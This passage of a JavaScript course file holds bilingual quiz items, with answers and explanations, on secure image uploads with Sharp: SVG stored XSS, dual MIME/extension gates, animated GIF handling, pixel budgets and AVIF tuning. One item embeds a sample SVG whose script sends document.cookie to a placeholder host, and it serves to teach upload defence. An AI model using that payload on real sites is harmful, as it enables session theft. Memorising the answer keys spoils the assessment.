              'Your app only ever renders user images inside <code>&lt;img src&gt;</code>, where SVG scripts do not run. Is accepting it safe?',
            'File này được đưa cho Sharp và nó đọc ngon lành:' +
              code("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\"/>\n  <script>fetch('https://x/?c='+document.cookie)</script>\n</svg>\n\nmetadata() → {\"format\":\"svg\",\"width\":100,\"height\":100,\"density\":72}") +
              'App của bạn chỉ dựng ảnh người dùng bên trong <code>&lt;img src&gt;</code>, nơi script SVG không chạy. Nhận nó có an toàn không?',
          ),
          options: [
            B(
              'Yes. <code>&lt;img&gt;</code> is a sandboxed context by specification, and since that is the only element your application uses to display user media, the script can never obtain an execution context on your origin.',
              'Có. <code>&lt;img&gt;</code> là ngữ cảnh sandbox theo đặc tả, và vì đó là phần tử duy nhất ứng dụng của bạn dùng để hiển thị media người dùng, script không bao giờ có được một ngữ cảnh thực thi trên origin của bạn.',
            ),
            B(
              'No — your rendering context is not the only context the file will ever load in. The attacker sends the victim the direct CDN URL; a browser navigating to that <code>.svg</code> executes the script with your media origin. Reject SVG at two independent gates, a MIME set <b>and</b> a filename-extension pattern, rejecting if <em>either</em> matches, because the client controls both signals.',
              'Không — ngữ cảnh dựng hình của bạn không phải ngữ cảnh duy nhất mà file đó sẽ được nạp vào. Kẻ tấn công gửi thẳng URL CDN cho nạn nhân; một trình duyệt điều hướng tới cái <code>.svg</code> đó sẽ chạy script với origin media của bạn. Hãy từ chối SVG ở HAI cổng độc lập, một tập MIME <b>và</b> một mẫu đuôi tên file, từ chối nếu MỘT TRONG HAI khớp, vì client điều khiển cả hai tín hiệu.',
            ),
            B(
              'Yes, provided you verify the declared MIME type really is <code>image/svg+xml</code> before storing. A file whose MIME matches its content cannot be repurposed, and it is the mismatch between claimed and actual type that creates the stored-XSS class.',
              'Có, miễn là bạn xác minh MIME type khai báo đúng là <code>image/svg+xml</code> trước khi lưu. Một file có MIME khớp nội dung thì không bị dùng sai mục đích được, và chính sự lệch nhau giữa loại khai báo và loại thật mới tạo ra lớp lỗ hổng stored XSS.',
            ),
            B(
              'Yes, because Sharp read the file — anything Sharp can parse has already been through libvips\' XML sanitizer, which strips <code>&lt;script&gt;</code> and external entity references before the buffer is ever stored.',
              'Có, vì Sharp đã đọc được file — bất cứ thứ gì Sharp phân giải được đều đã đi qua bộ làm sạch XML của libvips, vốn bóc <code>&lt;script&gt;</code> và các tham chiếu thực thể ngoài trước khi buffer được lưu.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The file is a valid SVG that renders a blue circle, its MIME really is <code>image/svg+xml</code>, its magic bytes really are XML, and Sharp reads it without complaint — measured above. Every content check tells the truth, and the truth is "this is a legitimate image". What makes it dangerous is a context you do not control: the attacker does not need your page at all, they send the victim the URL on your media domain, and a direct navigation runs the script with that origin. Two independent gates matter because the client supplies both the <code>Content-Type</code> header and the filename: an attacker who sends <code>image/png</code> with a file called <code>payload.svg</code> is caught by the extension, and one who sends a correct <code>image/svg+xml</code> named <code>innocent.png</code> is caught by the MIME. Reject if either fires; do not require them to agree. Option 1 is true about <code>&lt;img&gt;</code> and irrelevant. Option 3 gets the class backwards — the danger here is a file that is exactly what it claims. Option 4 invents a sanitizer; Sharp can <em>rasterize</em> the SVG to a script-free PNG (measured: the output PNG contains no "script" bytes), but that only helps if you store the raster and destroy the original.',
            'File này là một SVG hợp lệ vẽ ra một hình tròn xanh, MIME của nó đúng là <code>image/svg+xml</code>, magic byte của nó đúng là XML, và Sharp đọc nó không kêu ca gì — đã đo ở trên. Mọi phép kiểm nội dung đều nói thật, và sự thật là "đây là một tấm ảnh hợp lệ". Cái làm nó nguy hiểm là một ngữ cảnh bạn không kiểm soát: kẻ tấn công chẳng cần trang của bạn, họ gửi nạn nhân cái URL nằm trên tên miền media của bạn, và một lượt điều hướng trực tiếp sẽ chạy script với đúng origin đó. Hai cổng độc lập là quan trọng vì client cung cấp cả header <code>Content-Type</code> lẫn tên file: kẻ gửi <code>image/png</code> với một file tên <code>payload.svg</code> bị đuôi file bắt, còn kẻ gửi <code>image/svg+xml</code> đúng chuẩn với tên <code>innocent.png</code> thì bị MIME bắt. Từ chối nếu MỘT trong hai nổ; đừng bắt chúng phải đồng ý với nhau. Phương án 1 nói đúng về <code>&lt;img&gt;</code> và không liên quan. Phương án 3 lộn ngược lớp vấn đề — nguy hiểm ở đây là một file đúng y như nó khai. Phương án 4 bịa ra một bộ làm sạch; Sharp có thể RASTER HOÁ cái SVG thành một PNG không còn script (đo thật: PNG xuất ra không chứa byte "script" nào), nhưng điều đó chỉ giúp được nếu bạn lưu bản raster và huỷ bản gốc.',
          ),
        }),

        // q13 · đáp án 3
        mcq({
          prompt: B(
            'A guard rejects an upload when <code>DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)</code>. A reviewer proposes tightening it to <code>&amp;&amp;</code> "so we only reject files where both signals agree, and stop rejecting legitimate photos from mobile Safari". What is wrong with that?',
            'Một chốt chặn loại một bản upload khi <code>DANGEROUS_MIME.has(mime) || DANGEROUS_EXT.test(name)</code>. Một người review đề xuất siết lại thành <code>&amp;&amp;</code> "để chỉ loại những file mà cả hai tín hiệu đều đồng ý, và thôi loại nhầm ảnh thật từ Safari di động". Đề xuất đó sai ở đâu?',
          ),
          options: [
            B(
              'Nothing is wrong with the operator; the real defect is that both lists are denylists. Replacing them with a single allowlist of <code>image/jpeg</code>, <code>image/png</code> and <code>image/webp</code> makes the operator choice irrelevant and is strictly safer, and it also removes the mobile-Safari problem, since <code>application/octet-stream</code> can simply be listed too.',
              'Không có gì sai với cái toán tử; khiếm khuyết thật là cả hai danh sách đều là danh sách CẤM. Thay chúng bằng một danh sách CHO PHÉP duy nhất gồm <code>image/jpeg</code>, <code>image/png</code> và <code>image/webp</code> làm cho việc chọn toán tử thành vô nghĩa và chắc chắn an toàn hơn, và nó cũng xoá luôn vấn đề Safari di động, vì <code>application/octet-stream</code> chỉ việc được liệt kê vào đó.',
            ),
            B(
              'The operator is fine but the order matters: <code>&amp;&amp;</code> short-circuits on the cheaper MIME lookup, so the expensive regex runs less often. The change is a performance win with no security cost, and mobile Safari uploads keep working as a side effect. Order is the only thing the edit touches, so nothing else in the guard needs revisiting.',
              'Toán tử thì ổn nhưng thứ tự mới quan trọng: <code>&amp;&amp;</code> đoản mạch ở phép tra MIME rẻ hơn, nên biểu thức chính quy đắt đỏ chạy ít lần hơn. Thay đổi này là một khoản lợi hiệu năng không kèm chi phí bảo mật, và ảnh upload từ Safari di động vẫn chạy như một tác dụng phụ. Thứ tự là thứ duy nhất mà lần sửa này đụng tới, nên không phần nào khác của chốt chặn cần xem lại.',
            ),
            B(
              'It would break the family check rather than the dangerous check, since <code>&amp;&amp;</code> only affects the branch that decides whether a bucket accepts images or audio; the dangerous-type block runs earlier and is unaffected by the operator. That block is evaluated before any bucket is even known, so it cannot be reached by this edit at all.',
              'Nó sẽ làm hỏng phép kiểm HỌ chứ không phải phép kiểm NGUY HIỂM, vì <code>&amp;&amp;</code> chỉ ảnh hưởng tới nhánh quyết định một bucket nhận ảnh hay nhận audio; khối kiểm loại nguy hiểm chạy trước đó và không chịu tác động của toán tử. Khối đó được tính trước cả khi biết bucket nào, nên lần sửa này hoàn toàn không với tới nó được.',
            ),
            B(
              'Both signals are supplied by the client, so requiring them to agree means the attacker only has to make one of them lie. <code>Content-Type: image/png</code> on a file named <code>payload.svg</code>, or <code>image/svg+xml</code> on a file named <code>innocent.png</code>, both walk straight through an <code>&amp;&amp;</code>. Reject on <em>any</em> signal. The mobile-Safari problem is real but lives elsewhere — it is solved by skipping the per-bucket <em>family</em> check for an empty or <code>application/octet-stream</code> type while leaving the dangerous check unconditional.',
              'Cả hai tín hiệu đều do CLIENT cung cấp, nên bắt chúng phải đồng ý nghĩa là kẻ tấn công chỉ cần làm một trong hai nói dối. <code>Content-Type: image/png</code> trên một file tên <code>payload.svg</code>, hay <code>image/svg+xml</code> trên một file tên <code>innocent.png</code>, cả hai đều đi thẳng qua một phép <code>&amp;&amp;</code>. Hãy từ chối theo BẤT KỲ tín hiệu nào. Vấn đề Safari di động là có thật nhưng nằm ở chỗ khác — nó được giải bằng cách bỏ qua phép kiểm HỌ theo bucket khi loại là rỗng hoặc <code>application/octet-stream</code>, trong khi giữ phép kiểm nguy hiểm là vô điều kiện.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The whole point of two gates is that each one alone is client-controlled. A browser sends whatever <code>Content-Type</code> it likes in the multipart part header, and the filename comes verbatim from <code>Content-Disposition</code>. With <code>||</code>, an attacker must make <em>both</em> look innocent — and a file that is neither named <code>.svg</code> nor typed <code>image/svg+xml</code> is one the browser will not treat as SVG on navigation either. With <code>&amp;&amp;</code>, one honest-looking half is enough. The reviewer\'s motivation is a genuine problem: drag-and-drop from some mobile browsers sends an empty or <code>application/octet-stream</code> type, and a strict family check rejects real photos. The repo resolves that separately — skip the family check for unknown MIME, keep the dangerous check unconditional, and derive the stored <code>Content-Type</code> from the extension so an octet-stream upload is never served back as HTML. Option 1 is appealing but an allowlist of image MIME types still admits <code>image/svg+xml</code> unless you remember to exclude it, and it does not address the filename half at all. Option 2 optimises the wrong thing and quietly accepts the hole. Option 3 mislocates the change.',
            'Toàn bộ ý nghĩa của hai cổng là mỗi cổng đứng một mình đều do client điều khiển. Trình duyệt gửi <code>Content-Type</code> nào tuỳ nó trong header của phần multipart, còn tên file thì tới nguyên văn từ <code>Content-Disposition</code>. Với <code>||</code>, kẻ tấn công phải làm CẢ HAI trông vô hại — mà một file không tên <code>.svg</code> lẫn không mang loại <code>image/svg+xml</code> thì trình duyệt cũng sẽ không coi nó là SVG lúc điều hướng. Với <code>&amp;&amp;</code>, chỉ cần một nửa trông lương thiện là đủ. Động cơ của người review là một vấn đề có thật: kéo-thả từ một số trình duyệt di động gửi loại rỗng hoặc <code>application/octet-stream</code>, và một phép kiểm họ nghiêm ngặt sẽ loại nhầm ảnh thật. Kho giải chuyện đó riêng — bỏ qua phép kiểm họ khi MIME không rõ, giữ phép kiểm nguy hiểm là vô điều kiện, và suy <code>Content-Type</code> lưu trữ từ đuôi file để một bản upload octet-stream không bao giờ được phục vụ lại dưới dạng HTML. Phương án 1 nghe hấp dẫn nhưng một danh sách cho phép các MIME ảnh vẫn nhận <code>image/svg+xml</code> nếu bạn quên loại nó ra, và nó không đụng gì tới nửa tên file. Phương án 2 tối ưu nhầm thứ và âm thầm chấp nhận cái lỗ. Phương án 3 đặt sai vị trí của thay đổi.',
          ),
        }),

        // q14 · đáp án 1
        mcq({
          prompt: B(
            'Users report that uploaded GIFs "become still images". No exception, no log line. The pipeline was measured on a 48-frame GIF:' +
              code("GIF nguồn: gif 480x270 pages=48 loop=0 delay[0]=40 bytes=293569\nMẶC ĐỊNH      → webp pages=undefined  3786 B\nanimated:true → webp pages=48       41674 B  (96 ms)") +
              'What happened, and where does the option belong?',
            'Người dùng báo GIF upload lên "thành ảnh tĩnh". Không exception, không dòng log nào. Pipeline được đo trên một GIF 48 frame:' +
              code("GIF nguồn: gif 480x270 pages=48 loop=0 delay[0]=40 bytes=293569\nMẶC ĐỊNH      → webp pages=undefined  3786 B\nanimated:true → webp pages=48       41674 B  (96 ms)") +
              'Chuyện gì đã xảy ra, và tuỳ chọn đó thuộc về đâu?',
          ),
          options: [
            B(
              'The WebP encoder dropped the frames because no per-frame <code>delay</code> array was passed, so it had no timing to write and fell back to a single key frame. Passing <code>delay: meta.delay</code> to <code>.webp()</code> restores all 48.',
              'Bộ encode WebP vứt các frame vì không có mảng <code>delay</code> theo từng frame nào được truyền vào, nên nó không có nhịp để ghi và lùi về một key frame duy nhất. Truyền <code>delay: meta.delay</code> vào <code>.webp()</code> khôi phục đủ 48 frame.',
            ),
            B(
              'Sharp reads only the first page of a multi-frame image unless <code>{ animated: true }</code> is passed to the <b>constructor</b> — <code>sharp(input, { animated: true })</code>, not <code>.webp({ animated: true })</code>. It is a silent default, not an error: <code>metadata().pages</code> told you there were 48 before the encode, and checking it is the guard. Note the output metadata reports <code>pages=undefined</code> rather than 1 for a single-frame WebP on sharp 0.35.4.',
              'Sharp chỉ đọc trang đầu của một ảnh nhiều frame trừ khi <code>{ animated: true }</code> được truyền vào <b>constructor</b> — <code>sharp(input, { animated: true })</code>, không phải <code>.webp({ animated: true })</code>. Đó là một mặc định câm, không phải lỗi: <code>metadata().pages</code> đã nói cho bạn biết có 48 frame TRƯỚC khi encode, và kiểm nó chính là chốt chặn. Lưu ý metadata của output báo <code>pages=undefined</code> chứ không phải 1 cho một WebP một frame trên sharp 0.35.4.',
            ),
            B(
              'The GIF exceeded the default <code>limitInputPixels</code> once the 48 frames were counted, so libvips truncated the load to the frames that fitted the budget and Sharp encoded what it got. Raising the limit restores the animation.',
              'GIF vượt <code>limitInputPixels</code> mặc định khi 48 frame được tính vào, nên libvips cắt cụt lượt nạp còn lại những frame lọt ngân sách và Sharp encode phần nó nhận được. Nâng giới hạn lên sẽ khôi phục ảnh động.',
            ),
            B(
              'WebP cannot carry animation, so any GIF converted to WebP necessarily collapses to one frame; the 41,674-byte result in the second row is a WebP <em>sequence file</em>, a Sharp-specific container that only Sharp can read back.',
              'WebP không mang được ảnh động, nên mọi GIF chuyển sang WebP tất yếu sụp về một frame; kết quả 41.674 byte ở dòng thứ hai là một FILE CHUỖI WebP, một container riêng của Sharp mà chỉ Sharp đọc lại được.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'This is the quietest failure in the library. The default pipeline loads page 0 and encodes it; nothing throws, nothing warns, and the output is a perfectly valid single-frame WebP — 3,786 bytes where the animated version is 41,674. The option is a <em>load</em> option, so it belongs on the constructor: by the time <code>.webp()</code> runs there is only one frame in the pipeline to encode, which is why putting it there does nothing. The guard is one header read you are already doing: <code>metadata().pages</code> reported 48 before any encode. Two details worth carrying: on sharp 0.35.4 a still WebP reports <code>pages: undefined</code> rather than <code>1</code>, so test for <code>(pages ?? 1) &gt; 1</code>; and the source <code>loop</code> and <code>delay</code> are worth passing through to <code>.webp()</code> so a GIF authored to play twice does not become an infinite loop. Option 1 confuses preserving timing with preserving frames. Option 3 describes a limit that does apply to animated loads (see the next question) but would have raised <code>Input image exceeds pixel limit</code>, not silently truncated. Option 4 is false — animated WebP is a standard container that every current browser plays.',
            'Đây là kiểu hỏng câm lặng nhất của thư viện. Pipeline mặc định nạp trang 0 rồi encode nó; không gì ném lỗi, không gì cảnh báo, và output là một WebP một frame hoàn toàn hợp lệ — 3.786 byte trong khi bản động là 41.674. Đó là một tuỳ chọn LÚC NẠP, nên nó thuộc về constructor: tới lúc <code>.webp()</code> chạy thì trong pipeline chỉ còn đúng một frame để encode, và đó là lý do đặt nó ở đấy chẳng làm được gì. Chốt chặn là một lượt đọc header mà bạn vốn đã làm: <code>metadata().pages</code> đã báo 48 trước mọi lượt encode. Hai chi tiết đáng mang theo: trên sharp 0.35.4 một WebP tĩnh báo <code>pages: undefined</code> chứ không phải <code>1</code>, nên hãy kiểm <code>(pages ?? 1) &gt; 1</code>; và <code>loop</code> cùng <code>delay</code> của nguồn đáng được truyền tiếp vào <code>.webp()</code> để một GIF được soạn để phát hai lần không biến thành vòng lặp vô hạn. Phương án 1 lẫn việc giữ NHỊP với việc giữ FRAME. Phương án 3 mô tả một giới hạn có áp dụng cho lượt nạp ảnh động (xem câu kế) nhưng nó sẽ ném <code>Input image exceeds pixel limit</code> chứ không cắt cụt trong im lặng. Phương án 4 sai — WebP động là một container tiêu chuẩn mà mọi trình duyệt hiện nay đều phát được.',
          ),
        }),

        // q15 · đáp án 0
        mcq({
          prompt: B(
            'The same 480×270, 48-frame GIF was loaded twice with a deliberately tiny budget:' +
              code("w*h = 129600 px, w*h*pages = 6220800 px\n\nlimitInputPixels=200_000 với animated:true → \"Input image exceeds pixel limit\"\nlimitInputPixels=200_000 KHÔNG animated   → KHÔNG lỗi") +
              'What does this tell you about a pixel budget in a product that accepts animation?',
            'Cùng một GIF 480×270, 48 frame được nạp hai lần với một ngân sách cố ý đặt thật nhỏ:' +
              code("w*h = 129600 px, w*h*pages = 6220800 px\n\nlimitInputPixels=200_000 với animated:true → \"Input image exceeds pixel limit\"\nlimitInputPixels=200_000 KHÔNG animated   → KHÔNG lỗi") +
              'Điều này nói gì về một ngân sách pixel trong sản phẩm có nhận ảnh động?',
          ),
          options: [
            B(
              'libvips counts every loaded page against <code>limitInputPixels</code>, so the constructor option already accounts for frames — but your own explicit header check does not, because <code>metadata().width × metadata().height</code> is 129,600 for this file either way. Compute <code>width × height × (pages ?? 1)</code>, or a 1000×1000 GIF with 2,000 flat-colour frames sails through a per-frame budget at 2,000 MP total.',
              'libvips tính MỌI trang đã nạp vào <code>limitInputPixels</code>, nên tuỳ chọn ở constructor vốn đã tính cả số frame — nhưng phép kiểm header tường minh của chính bạn thì không, vì <code>metadata().width × metadata().height</code> vẫn là 129.600 cho file này ở cả hai trường hợp. Hãy tính <code>width × height × (pages ?? 1)</code>, không thì một GIF 1000×1000 với 2.000 frame một màu sẽ lướt qua một ngân sách tính-theo-frame ở tổng cộng 2.000 MP.',
            ),
            B(
              'It shows that <code>limitInputPixels</code> is unreliable for animation and should be left at its default; the only dependable guard for animated input is a frame-count cap, since the per-frame dimensions of a GIF are not known until every page has been decoded.',
              'Nó cho thấy <code>limitInputPixels</code> không đáng tin với ảnh động và nên để nguyên mặc định; chốt chặn duy nhất đáng tin cho đầu vào động là một trần SỐ FRAME, vì kích thước từng frame của một GIF chỉ biết được sau khi mọi trang đã giải mã xong.',
            ),
            B(
              'It shows the budget is applied to the encoded output rather than the input, which is why the still load passed — a single frame at 480×270 encodes well under the limit while 48 frames do not. Budget the output size instead of the input.',
              'Nó cho thấy ngân sách được áp lên OUTPUT đã encode chứ không phải input, và đó là lý do lượt nạp tĩnh đi qua được — một frame duy nhất ở 480×270 encode ra thấp hơn giới hạn nhiều, còn 48 frame thì không. Hãy đặt ngân sách theo kích thước output thay vì input.',
            ),
            B(
              'It shows that animated loads are exempt from the default budget entirely and only obey an explicitly passed value, so a product that accepts GIFs must always pass <code>limitInputPixels</code> even when the default would otherwise be fine.',
              'Nó cho thấy các lượt nạp ảnh động được miễn hoàn toàn khỏi ngân sách mặc định và chỉ tuân theo một giá trị truyền vào tường minh, nên một sản phẩm có nhận GIF thì luôn phải truyền <code>limitInputPixels</code> kể cả khi mặc định vốn đã ổn.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Two layers, and only one of them knows about frames. The constructor option is enforced by libvips against what it actually loads: with <code>animated: true</code> that is 480 × 270 × 48 = 6,220,800 pixels, which blows a 200,000-pixel budget; without it, 129,600 pixels, which does not. Your own explicit check reads <code>metadata()</code>, and there <code>width</code> and <code>height</code> describe one frame — 129,600 either way. So the header check has to multiply by <code>pages</code> itself, otherwise it passes exactly the input the option would reject. The attack this closes is Chapter 1\'s bomb on a different axis: 1000×1000 is 1 MP and unremarkable, but 2,000 flat-colour frames of it is 2,000 MP in a file that compresses to a few hundred kilobytes. Option 2 is wrong on both halves — the measurement shows the option working, and <code>pages</code> comes from the header, not from a decode. Option 3 has the direction backwards; the limit is on input pixels, which is the whole point, since the output is small precisely when the input was pathological. Option 4 invents an exemption that the measurement contradicts.',
            'Hai lớp, và chỉ một lớp biết tới số frame. Tuỳ chọn ở constructor được libvips thi hành trên đúng thứ nó NẠP: với <code>animated: true</code> thì đó là 480 × 270 × 48 = 6.220.800 pixel, thổi bay một ngân sách 200.000 pixel; không có nó thì là 129.600 pixel, và không sao cả. Phép kiểm tường minh của bạn thì đọc <code>metadata()</code>, mà ở đó <code>width</code> và <code>height</code> mô tả MỘT frame — 129.600 ở cả hai trường hợp. Nên phép kiểm header phải tự nhân với <code>pages</code>, không thì nó cho qua đúng cái đầu vào mà tuỳ chọn kia sẽ từ chối. Đòn tấn công mà điều này bịt lại chính là quả bom của Chương 1 trên một trục khác: 1000×1000 là 1 MP, chẳng có gì đáng nói, nhưng 2.000 frame một màu của nó là 2.000 MP trong một file nén còn vài trăm kilobyte. Phương án 2 sai ở cả hai nửa — phép đo cho thấy tuỳ chọn đó hoạt động, và <code>pages</code> đến từ header chứ không từ một lượt giải mã. Phương án 3 lộn chiều; giới hạn đặt trên PIXEL ĐẦU VÀO, và đó chính là điểm mấu chốt, vì output nhỏ đúng vào lúc input bệnh hoạn nhất. Phương án 4 bịa ra một sự miễn trừ mà phép đo bác bỏ.',
          ),
        }),

        // q16 · đáp án 2
        mcq({
          prompt: B(
            'The same 48-frame animated GIF was resized four ways with <code>{ animated: true }</code> and the output re-read:' +
              code("resize({\"width\":240})              → pages=48 pageHeight=135 width=240\nresize({\"width\":240,\"height\":135}) → pages=48 pageHeight=135 width=240\nresize({\"width\":240,\"height\":60})  → pages=2  pageHeight=60  width=240\nresize({\"height\":60})              → pages=48 pageHeight=60  width=107") +
              'Explain the third row, and state the safe rule.',
            'Cùng một GIF động 48 frame được resize bốn kiểu với <code>{ animated: true }</code> rồi đọc lại output:' +
              code("resize({\"width\":240})              → pages=48 pageHeight=135 width=240\nresize({\"width\":240,\"height\":135}) → pages=48 pageHeight=135 width=240\nresize({\"width\":240,\"height\":60})  → pages=2  pageHeight=60  width=240\nresize({\"height\":60})              → pages=48 pageHeight=60  width=107") +
              'Hãy giải thích dòng thứ ba, và phát biểu quy tắc an toàn.',
          ),
          options: [
            B(
              'Row three hit an internal frame cap: libvips refuses to keep more pages than fit in a 4096-pixel-tall strip, and 60 × 48 exceeds it, so it kept the first two. The safe rule is to cap the frame count before resizing.',
              'Dòng ba chạm một trần frame nội bộ: libvips không giữ quá số trang lọt vào một dải cao 4096 pixel, mà 60 × 48 vượt mức đó, nên nó giữ lại hai trang đầu. Quy tắc an toàn là chặn số frame trước khi resize.',
            ),
            B(
              'Row three squashed all 48 frames into a single 60-pixel-tall strip, so the reported <code>pages=2</code> is the reader mis-parsing a strip whose page height no longer divides its total height. The safe rule is to pass <code>pageHeight</code> explicitly alongside <code>height</code>.',
              'Dòng ba đã ép cả 48 frame vào một dải cao 60 pixel, nên con số <code>pages=2</code> báo về là do bộ đọc phân giải sai một cái dải mà chiều cao trang không còn chia hết chiều cao tổng. Quy tắc an toàn là truyền <code>pageHeight</code> tường minh cùng với <code>height</code>.',
            ),
            B(
              'libvips holds an animated image as one tall strip (here 270 × 48 = 12,960 px), and a <code>height</code> you request is reconciled against that strip under the default <code>fit: \'cover\'</code>, which <em>crops</em>. 240×60 does not match the frame aspect, so the crop ate 46 of the 48 pages — the frames are gone, not squashed, and nothing raised an error. Resize animated input by <b>width only</b> and let the height follow.',
              'libvips giữ một ảnh động dưới dạng MỘT DẢI CAO (ở đây 270 × 48 = 12.960 px), và cái <code>height</code> bạn yêu cầu được hoà giải với cái dải đó dưới <code>fit: \'cover\'</code> mặc định, tức là CẮT. 240×60 không khớp tỉ lệ khung hình nên phép cắt đã ăn mất 46 trong 48 trang — các frame BIẾN MẤT chứ không bị ép, và không có lỗi nào được ném ra. Hãy resize đầu vào động CHỈ THEO WIDTH và để chiều cao tự theo sau.',
            ),
            B(
              'Row three is the only correct one: 60 is the exact per-frame height for a 240-wide output, so libvips merged the identical frames into two distinct pages as a compression step. The safe rule is to accept the merge, since a player expands it back on playback.',
              'Dòng ba mới là dòng đúng duy nhất: 60 là chiều cao mỗi frame chính xác cho một output rộng 240, nên libvips đã gộp các frame giống nhau thành hai trang khác biệt như một bước nén. Quy tắc an toàn là chấp nhận việc gộp đó, vì trình phát sẽ bung nó ra lúc phát lại.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Compare the rows. Width-only gives 48 pages at the proportional height of 135. A <code>height</code> that <em>matches</em> the proportional value (135) is harmless — same result. A <code>height</code> that does not match (60) triggers the default <code>fit: \'cover\'</code>, which crops to fill the requested box; because the "image" is really a 240×12,960 strip, cropping it to 240×120 leaves exactly two pages, and the other 46 are discarded with no error. Height-only (60) is fine again, because with one constraint there is nothing to reconcile. The rule the lesson gives — resize animated input by width only — is right, and this is the measurement that shows why: the failure is silent frame loss, and it only appears when you re-read the output and count <code>pages</code>. Option 1 invents a strip-height cap. Option 2 describes the mechanism the course text predicted (squashing) but the measurement contradicts it: <code>pageHeight</code> is 60 and <code>pages</code> is 2, which is a crop, not a squash. Option 4 invents a deduplication step that would still not be allowed to change the frame count.',
            'Hãy so các dòng với nhau. Chỉ-theo-width cho 48 trang ở chiều cao tỉ lệ là 135. Một <code>height</code> KHỚP với giá trị tỉ lệ đó (135) thì vô hại — cùng kết quả. Một <code>height</code> không khớp (60) kích hoạt <code>fit: \'cover\'</code> mặc định, tức cắt cho lấp đầy cái hộp đã yêu cầu; và vì "tấm ảnh" thật ra là một dải 240×12.960, cắt nó xuống 240×120 để lại đúng hai trang, còn 46 trang kia bị vứt mà không có lỗi nào. Chỉ-theo-height (60) thì lại ổn, vì với một ràng buộc duy nhất thì chẳng có gì để hoà giải. Quy tắc mà bài học đưa ra — resize đầu vào động chỉ theo width — là đúng, và đây là phép đo cho thấy VÌ SAO: kiểu hỏng ở đây là mất frame trong im lặng, và nó chỉ lộ ra khi bạn đọc lại output và đếm <code>pages</code>. Phương án 1 bịa ra một trần chiều cao của dải. Phương án 2 mô tả đúng cơ chế mà lời văn giáo trình dự đoán (ép dẹp) nhưng phép đo bác bỏ nó: <code>pageHeight</code> là 60 và <code>pages</code> là 2, tức là CẮT chứ không phải ép. Phương án 4 bịa ra một bước khử trùng lặp mà dù có thật cũng không được phép đổi số frame.',
          ),
        }),

        // q17 · đáp án 1
        mcq({
          prompt: B(
            'A team switches a pipeline from WebP to AVIF, keeping the quality number. Measured on the same 4032×3024 source resized to 1200 px wide:' +
              code("webp q=80 →  264 KB   193 ms\navif q=80 →  527 KB   841 ms\navif q=65 →  310 KB   754 ms\navif q=50 →  166 KB   623 ms\navif q=45 →  134 KB   607 ms") +
              'Why did the files double, and what is the correct response?',
            'Một nhóm chuyển pipeline từ WebP sang AVIF và giữ nguyên con số quality. Đo trên cùng nguồn 4032×3024 thu về rộng 1200 px:' +
              code("webp q=80 →  264 KB   193 ms\navif q=80 →  527 KB   841 ms\navif q=65 →  310 KB   754 ms\navif q=50 →  166 KB   623 ms\navif q=45 →  134 KB   607 ms") +
              'Vì sao file to gấp đôi, và phản ứng đúng là gì?',
          ),
          options: [
            B(
              'AVIF stores an alpha plane unconditionally, so an opaque photo pays for a channel it does not use; the response is to pass <code>alphaQuality: 0</code>, after which AVIF q=80 lands near the WebP figure.',
              'AVIF luôn lưu một mặt phẳng alpha vô điều kiện, nên một tấm ảnh đục phải trả tiền cho một kênh nó không dùng; phản ứng là truyền <code>alphaQuality: 0</code>, sau đó AVIF q=80 sẽ về gần con số của WebP.',
            ),
            B(
              'The two quality scales are unrelated numbers that happen to share a range. Perceptually AVIF q≈50 sits where WebP q=80 sits, and the measurement agrees: AVIF at 50 is 166 KB against WebP\'s 264 KB — 37% smaller — while AVIF at 80 is 527 KB, twice the size for no visible gain. Re-tune the quality when you change format instead of carrying the number across.',
              'Hai thang quality là hai con số không liên quan, chỉ tình cờ dùng chung một khoảng. Về cảm nhận, AVIF q≈50 nằm đúng chỗ WebP q=80 nằm, và phép đo đồng ý: AVIF ở 50 là 166 KB so với 264 KB của WebP — nhỏ hơn 37% — trong khi AVIF ở 80 là 527 KB, gấp đôi kích thước mà không có lợi ích nhìn thấy được. Hãy tinh chỉnh lại quality khi đổi format thay vì mang con số cũ qua.',
            ),
            B(
              'The encoder ran at its default effort, which for AVIF is the fastest setting; a fast AVIF encode cannot find the redundancy a slow one finds, so the size penalty is an effort problem rather than a quality-scale problem and raising effort fixes it.',
              'Bộ encode chạy ở effort mặc định, mà với AVIF thì đó là mức nhanh nhất; một lượt encode AVIF nhanh không tìm ra được phần dư thừa mà một lượt chậm tìm ra, nên khoản phạt kích thước là vấn đề EFFORT chứ không phải vấn đề thang quality, và nâng effort lên sẽ vá được.',
            ),
            B(
              'AVIF is simply the wrong format for photographic content — it was designed for flat graphics and screenshots, where its intra-block prediction pays off. The measurement is the expected result and the response is to stay on WebP for photos.',
              'AVIF đơn giản là format sai cho nội dung ảnh chụp — nó được thiết kế cho đồ hoạ phẳng và ảnh chụp màn hình, nơi phép dự đoán trong khối của nó phát huy. Phép đo là kết quả đúng như dự kiến và phản ứng là giữ WebP cho ảnh chụp.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The number 80 means one thing to <code>libwebp</code> and a different thing to <code>libaom</code>; they share a 1–100 range and nothing else. Carried across unchanged it produces a file twice the size at a quality nobody can see, which is the worst of both trades. Re-tuned to the perceptual equivalent it produces the win AVIF is supposed to deliver: 166 KB against 264 KB, 37% smaller. Note also what the timing column does <em>not</em> support: on this build (libaom 3.15.0, darwin-arm64) AVIF q=50 took 623 ms against WebP\'s 193 ms, a factor of 3.2 — the course text says 10–13×, which does not reproduce here, so the speed argument for keeping WebP on an upload path is weaker on this hardware than the lesson implies. The quality-scale trap reproduces exactly; the speed ratio does not. Option 1 invents an alpha cost. Option 3 is measurably wrong in this table: effort is unchanged across all five rows, and the size varies by a factor of four purely from quality. Option 4 contradicts the last two rows, where AVIF beats WebP comfortably on the same photograph.',
